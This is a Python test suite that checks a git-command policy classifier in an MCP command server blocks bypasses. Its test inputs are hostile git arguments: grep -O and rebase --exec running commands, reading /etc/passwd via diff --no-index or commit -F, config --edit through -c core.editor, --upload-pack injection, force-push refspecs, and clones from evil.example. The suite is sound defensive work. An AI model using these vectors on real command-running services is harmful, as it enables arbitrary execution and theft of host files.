"""Security regressions for the git-command policy classifier.

These cover trust-boundary bypasses in _ensure_git_context_for_command and its
helpers:
  * Fix 2 - RCE / policy bypass via git global prefix options (-c, -C, ...)
    and `git config --edit` slipping past the read-only classifier.
  * Fix 3 - remote branch deletion via an empty-source `:branch` refspec.
  * Fix 4 - force-push (-f/--force/--force-with-lease) and a leading `+`
    forced-update refspec.
  * Fix 5 - fetch/pull refspecs that update arbitrary local refs.

Setup mirrors tests/test_repo_context.py: a real git repo on `main` bound to a
configured repo context with default_branch=main.
"""

import shutil
import subprocess
import sys
import unittest
from pathlib import Path

import importlib
import os
import tempfile
from unittest import mock

PROJECT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(PROJECT))

# Patches os.environ (auto-restored in tearDown) instead of mutating it
# directly — a direct mutation here previously leaked MCP_AUTH_MODE=legacy
# etc. into later test modules that inherit os.environ.
_ENV = {
    "MCP_TOKEN": "git-hardening-test-token",
    "MCP_PORT": "8768",
    "MCP_ALLOW_COMMANDS": "1",
    "MCP_ALLOWED_COMMANDS": "git,python3",
    "MCP_SERVEO_HOSTNAME": "",
    "MCP_AUTH_MODE": "legacy",
}


def load_server(base_dir):
    env = dict(_ENV, MCP_BASE_DIR=str(base_dir))
    mock.patch.dict(os.environ, env).start()
    sys.modules.pop("server", None)
    return importlib.import_module("server")


@unittest.skipUnless(shutil.which("git"), "git is required for git-policy tests")
class GitHardeningTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.workspace = Path(self._tmp.name)
        ws = self.workspace
        subprocess.run(["git", "init"], cwd=ws, check=True, capture_output=True)
        subprocess.run(["git", "branch", "-M", "main"], cwd=ws, check=True, capture_output=True)
        subprocess.run(
            ["git", "remote", "add", "origin", "https://github.com/example/project.git"],
            cwd=ws, check=True, capture_output=True,
        )
        self.server = load_server(ws)
        self.server._save_repo_context(
            cwd=ws, status="configured",
            repository_url="https://github.com/example/project.git",
            is_fork=False, upstream_url="", default_branch="main",
            branch_mode="default_branch", commit_branch="", git_enabled=True,
            disabled_reason="",
            last_detected_origin="https://github.com/example/project.git",
            last_detected_branch="main",
        )

    def tearDown(self):
        self._tmp.cleanup()
        mock.patch.stopall()


    def _check(self, args):
        self.server._ensure_git_context_for_command(self.workspace, list(args))

    # -- Fix 2: dangerous global options + config --edit ------------------
    def test_dash_c_core_editor_config_edit_refused(self):
        with self.assertRaises(ValueError) as ctx:
            self._check(["-c", "core.editor=touch", "config", "--edit"])
        self.assertIn("blocked", str(ctx.exception).lower())

    def test_dash_C_retarget_refused(self):
        # -C on the bound workspace: detection still succeeds, so the refusal
        # must come from the global-option guard itself.
        with self.assertRaises(ValueError) as ctx:
            self._check(["-C", str(self.workspace), "status"])
        self.assertIn("blocked", str(ctx.exception).lower())

    def test_config_edit_classified_as_mutating(self):
        with self.assertRaises(ValueError) as ctx:
            self._check(["config", "--edit"])
        self.assertIn("mutating git config", str(ctx.exception))

    def test_config_edit_short_flag_classified_as_mutating(self):
        self.assertFalse(self.server._is_git_config_read_only(["-e"]))
        self.assertFalse(self.server._is_git_config_read_only(["--edit"]))

    # -- Fix 3: empty-source (delete) refspec -----------------------------
    def test_push_delete_branch_refspec_refused(self):
        with self.assertRaises(ValueError) as ctx:
            self._check(["push", "origin", ":main"])
        self.assertIn("blocked", str(ctx.exception).lower())

    # -- Fix 4: force-push and leading-+ refspec --------------------------
    def test_push_force_flag_refused(self):
        with self.assertRaises(ValueError) as ctx:
            self._check(["push", "--force", "origin", "main"])
        self.assertIn("blocked", str(ctx.exception).lower())

    def test_push_force_short_flag_refused(self):
        with self.assertRaises(ValueError):
            self._check(["push", "-f", "origin", "main"])

    def test_push_force_with_lease_refused(self):
        with self.assertRaises(ValueError):
            self._check(["push", "--force-with-lease", "origin", "main"])

    def test_push_plus_refspec_refused(self):
        with self.assertRaises(ValueError) as ctx:
            self._check(["push", "origin", "+main"])
        self.assertIn("blocked", str(ctx.exception).lower())

    # -- Fix 5: fetch/pull local-ref refspecs -----------------------------
    def test_fetch_arbitrary_local_ref_refused(self):
        with self.assertRaises(ValueError) as ctx:
            self._check(["fetch", "origin", "main:refs/heads/evil"])
        self.assertIn("blocked", str(ctx.exception).lower())

    def test_fetch_plus_refspec_refused(self):
        with self.assertRaises(ValueError):
            self._check(["fetch", "origin", "+main:main"])

    def test_pull_arbitrary_local_ref_refused(self):
        with self.assertRaises(ValueError):
            self._check(["pull", "origin", "main:refs/heads/evil"])

    def test_fetch_target_branch_refspec_allowed(self):
        # A refspec that only updates the configured target branch is fine.
        self._check(["fetch", "origin", "main:refs/heads/main"])

    # -- Fix 6 (2.4.0): options that escape a "read-only" subcommand ------
    # Each of these was verified against a real git binary before the fix:
    # the option ran a program or touched a path outside the workspace even
    # though its subcommand is classified read-only / branch-bound.
    def test_grep_open_files_in_pager_refused(self):
        # `git grep -O'<cmd>'` runs <cmd> once per matching file -> full
        # arbitrary execution, bypassing MCP_ALLOWED_COMMANDS entirely.
        with self.assertRaises(ValueError) as ctx:
            self._check(["grep", "-Oecho pwned", "needle"])
        self.assertIn("arbitrary program", str(ctx.exception))

    def test_grep_open_files_in_pager_long_form_refused(self):
        with self.assertRaises(ValueError):
            self._check(["grep", "--open-files-in-pager=echo pwned", "needle"])

    def test_grep_without_pager_option_allowed(self):
        self._check(["grep", "-n", "needle"])

    def test_rebase_exec_refused(self):
        # `git rebase --exec` runs a command after every replayed commit and
        # rebase is branch-bound-allowed, so this was arbitrary execution.
        with self.assertRaises(ValueError):
            self._check(["rebase", "--exec", "echo pwned", "HEAD~1"])

    def test_rebase_exec_short_flag_refused(self):
        with self.assertRaises(ValueError):
            self._check(["rebase", "-x", "echo pwned", "HEAD~1"])

    def test_diff_no_index_refused(self):
        # `git diff --no-index <abs> /dev/null` reads any file on the host.
        with self.assertRaises(ValueError) as ctx:
            self._check(["diff", "--no-index", "/etc/passwd", "/dev/null"])
        self.assertIn("outside the approved workspace", str(ctx.exception))

    def test_diff_output_refused(self):
        # `git diff --output=<abs>` writes any file on the host.
        with self.assertRaises(ValueError):
            self._check(["diff", "--output=/tmp/escaped.txt"])

    def test_log_output_refused(self):
        with self.assertRaises(ValueError):
            self._check(["log", "--output", "/tmp/escaped.txt"])

    def test_fetch_upload_pack_refused(self):
        with self.assertRaises(ValueError):
            self._check(["fetch", "--upload-pack=echo pwned", "origin"])

    def test_push_receive_pack_refused(self):
        with self.assertRaises(ValueError):
            self._check(["push", "--receive-pack=echo pwned", "origin", "main"])

    def test_tail_git_dir_refused(self):
        # Rejected as a global prefix option; must also be rejected after the
        # subcommand, where the prefix scan no longer looks.
        with self.assertRaises(ValueError):
            self._check(["status", "--git-dir=/elsewhere/.git"])

    def test_commit_file_outside_workspace_refused(self):
        # `git commit -F /etc/passwd` embeds the file in a commit message the
        # client can read straight back with `git log`.
        with self.assertRaises(ValueError):
            self._check(["commit", "-F", "/etc/passwd"])

    def test_commit_file_inside_workspace_allowed(self):
        (self.workspace / "msg.txt").write_text("subject\n", encoding="utf-8")
        self._check(["commit", "-F", "msg.txt"])

    def test_clean_x_still_allowed(self):
        # -x is banned for rebase only; for `git clean` it means "also remove
        # ignored files" and must keep working.
        self._check(["clean", "-fdx"])

    def test_ls_files_o_still_allowed(self):
        # Lower-case -o on ls-files is --others; only grep's -O is banned.
        self._check(["ls-files", "-o"])

    def test_pathspec_after_double_dash_not_scanned_as_option(self):
        # Everything after `--` is a pathspec; a file literally named
        # "--output" must not be mistaken for the banned option.
        self._check(["log", "--", "--output"])

    # -- Fix 7 (2.4.0): symbolic-ref is not read-only ---------------------
    def test_symbolic_ref_read_allowed(self):
        self._check(["symbolic-ref", "HEAD"])
        self._check(["symbolic-ref", "--short", "HEAD"])

    def test_symbolic_ref_write_refused(self):
        # Repoints HEAD at another branch, moving the workspace off the
        # branch the policy pins it to.
        with self.assertRaises(ValueError) as ctx:
            self._check(["symbolic-ref", "HEAD", "refs/heads/evil"])
        self.assertIn("blocked", str(ctx.exception).lower())

    def test_symbolic_ref_delete_refused(self):
        with self.assertRaises(ValueError):
            self._check(["symbolic-ref", "-d", "refs/heads/main"])

    # -- Fix 8 (2.4.0): clustered short options ---------------------------
    # git's parse-options accepts `-uf` as `-u -f`; verified against a real
    # git binary, which takes `-uf` and rejects a bogus cluster like `-zf`.
    # Exact-token matching therefore missed every clustered form.
    def test_push_clustered_force_refused(self):
        for cluster in ("-uf", "-fu", "-qf", "-fnv"):
            with self.assertRaises(ValueError, msg=cluster):
                self._check(["push", cluster, "origin", "main"])

    def test_push_clustered_without_force_allowed(self):
        self._check(["push", "-uq", "origin", "main"])

    def test_branch_clustered_delete_is_not_read_only(self):
        self.assertFalse(self.server._is_git_branch_read_only(["-rd", "topic"]))

    def test_tag_clustered_force_is_not_read_only(self):
        self.assertFalse(self.server._is_git_tag_read_only(["-af", "v1"]))

    def test_expand_short_clusters_keeps_long_options_intact(self):
        expand = self.server._expand_short_clusters
        self.assertEqual(expand(["--force-with-lease"]), ["--force-with-lease"])
        self.assertEqual(expand(["-f"]), ["-f"])
        self.assertEqual(expand(["main"]), ["main"])
        self.assertEqual(expand(["-uf"]), ["-uf", "-u", "-f"])

    # -- Fix 9 (2.4.0): --follow-tags writes unvalidated tag refs ---------
    def test_push_follow_tags_refused(self):
        with self.assertRaises(ValueError) as ctx:
            self._check(["push", "--follow-tags", "origin", "main"])
        self.assertIn("blocked", str(ctx.exception).lower())

    # -- Default-deny safety net for unclassified subcommands -------------
    # These are the reason the classifier ends in a raise rather than a
    # return. Pin it so an accidental explicit-allow shows up as a test diff.
    def test_dangerous_subcommands_are_denied_by_default(self):
        for argv in (
            ["submodule", "add", "https://evil.example/repo", "x"],
            ["submodule", "update", "--init"],
            ["clone", "https://evil.example/repo"],
            ["filter-branch", "--tree-filter", "touch pwned"],
            ["worktree", "add", "/tmp/elsewhere"],
            ["bisect", "run", "sh", "-c", "echo pwned"],
            ["apply", "patch.diff"],
            ["archive", "--remote=ssh://evil.example/x", "HEAD"],
            ["update-ref", "refs/heads/main", "HEAD"],
            ["daemon"],
            ["co"],  # an alias, which would run whatever .git/config defines
        ):
            with self.assertRaises(ValueError, msg=" ".join(argv)) as ctx:
                self._check(argv)
            self.assertIn("blocked", str(ctx.exception).lower(), " ".join(argv))


if __name__ == "__main__":
    unittest.main()
